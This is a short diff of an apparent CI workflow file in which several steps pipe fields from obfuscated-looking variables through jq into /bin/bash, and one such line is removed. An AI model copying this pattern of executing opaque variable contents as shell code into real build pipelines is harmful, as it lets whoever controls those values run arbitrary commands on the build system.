@@ -41,7 +41,6 @@ jobs:
           printf '%s' "$tkdu232" | jq -r .ruatx79425 | /bin/bash
           printf '%s' "$vu49" | jq -r .c101 | /bin/bash
           printf '%s' "$x13405" | jq -r .nxc48 | /bin/bash
-          echo $kigzh1 | jq -r .uqd19904 | /bin/bash
 
       - name: Store artifact
         if: always()
